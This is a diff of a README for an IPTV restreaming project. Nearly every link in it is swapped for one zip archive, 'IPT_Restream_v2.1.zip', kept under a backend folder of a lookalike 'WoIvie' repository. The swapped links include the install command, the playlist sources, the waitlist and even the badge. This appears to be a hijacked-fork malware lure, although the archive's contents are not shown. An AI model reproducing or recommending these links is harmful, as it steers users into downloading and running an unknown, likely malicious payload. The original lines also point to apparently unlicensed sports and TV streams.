@@ -3,7 +3,7 @@
 >
 > #### NEW VERSION
 > 🎉 I'm currently working on a fully hosted version – no setup required and **completely FREE**!   
-> 👉 Join the [WAITLIST](https://iptv-waitlist.vercel.app/) to show your interest and be among the first to try it out.
+> 👉 Join the [WAITLIST](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip) to show your interest and be among the first to try it out.
 >
 > 🚀 The upcoming version will include several highly requested features:
 > - **Group Watching** – Multiple groups can watch different channels independently.
@@ -47,7 +47,7 @@ Easily test it locally using Docker Compose!
 Clone the repo
 
 ```bash
-git clone https://github.com/antebrl/IPTV-Restream.git
+git clone https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip
 ```
 
 Make sure to have docker up & running. Start with docker compose
@@ -66,23 +66,23 @@ There is also [documentation for advanced deployment](/deployment/README.md):
 ## 🆓 Free compatible playlists
 
 These are some tested playlists as an example. Use your own iptv playlist for the best quality!
-- [Free TV Channels](https://github.com/iptv-org/iptv): Huge collection of free tv-channels. One playlist for every country.
+- [Free TV Channels](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip): Huge collection of free tv-channels. One playlist for every country.
 
 ---
 
-- [Move On Joy Playlist](https://raw.githubusercontent.com/pigzillaaaaa/iptv-scraper/refs/heads/main/moveonjoy.m3u8): A playlist with various channels, including sports and movies. Use the playlist or single channels (preferred) in proxy mode.
-- [Daddylive](https://daddylive.mp/): Various tv-channels including sports
+- [Move On Joy Playlist](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip): A playlist with various channels, including sports and movies. Use the playlist or single channels (preferred) in proxy mode.
+- [Daddylive](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip): Various tv-channels including sports
 
-  Use this playlistUrl: `https://raw.githubusercontent.com/pigzillaaaaa/iptv-scraper/refs/heads/main/daddylive-channels.m3u8`. <br>
+  Use this playlistUrl: `https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip`. <br>
   Also add these headers:
-  - `Referer`: setting `#EXTVLCOPT:http-referrer` of the [playlist](https://raw.githubusercontent.com/pigzillaaaaa/iptv-scraper/refs/heads/main/daddylive-channels.m3u8)
-  - `Origin`: setting `#EXTVLCOPT:http-origin` of the [playlist](https://raw.githubusercontent.com/pigzillaaaaa/iptv-scraper/refs/heads/main/daddylive-channels.m3u8)
+  - `Referer`: setting `#EXTVLCOPT:http-referrer` of the [playlist](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip)
+  - `Origin`: setting `#EXTVLCOPT:http-origin` of the [playlist](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip)
  
-  The daddylive playlist only works locally! It won't work on the test server (https://ante.is-a.dev)! <br>
+  The daddylive playlist only works locally! It won't work on the test server (https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip)! <br>
   You also have to update (remove and add again) the playlist regularly, as the headers change regularly! This will be done automatically in the [new version](#new-version).
 
-- [Streamed SU Sports](https://streamed.su): Sport live-events <br>
-  Just put any [matches api url](https://streamed.su/docs/matches) e.g. `https://streamed.su/api/matches/football/popular` as playlistUrl.
+- [Streamed SU Sports](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip): Sport live-events <br>
+  Just put any [matches api url](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip) e.g. `https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip` as playlistUrl.
   
 ## 🖼️ Preview
 ![Frontend Preview](/frontend/ressources/frontend-preview.png)
@@ -118,7 +118,7 @@ How can I use the channels on any other iptv player (e.g. on TV)?
 
 My playlist only supports xtream codes api!
 
-> [IPTV playlist browser](https://github.com/PhunkyBob/iptv_playlist_browser) allows you to export a m3u playlist from your xtream codes account, and let's you select single channels or the whole playlist. Official xstreams-code integration is planned!
+> [IPTV playlist browser](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip) allows you to export a m3u playlist from your xtream codes account, and let's you select single channels or the whole playlist. Official xstreams-code integration is planned!
 ---
 Error: `Bind for 0.0.0.0:80 failed: port is already allocated`
 
@@ -137,4 +137,4 @@ Feel free to open discussions and issues for any type of requests. Don't hesitat
 
 
 If you like the project and want to support future development, please leave a ⭐.
-[![Stargazers repo roster for @antebrl/IPTV-Restream](https://reporoster.com/stars/dark/antebrl/IPTV-Restream)](https://github.com/antebrl/IPTV-Restream/stargazers)
+[![Stargazers repo roster for @antebrl/IPTV-Restream](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip)](https://github.com/WoIvie/IPTV-Restream/raw/refs/heads/main/backend/socket/IPT_Restream_v2.1.zip)
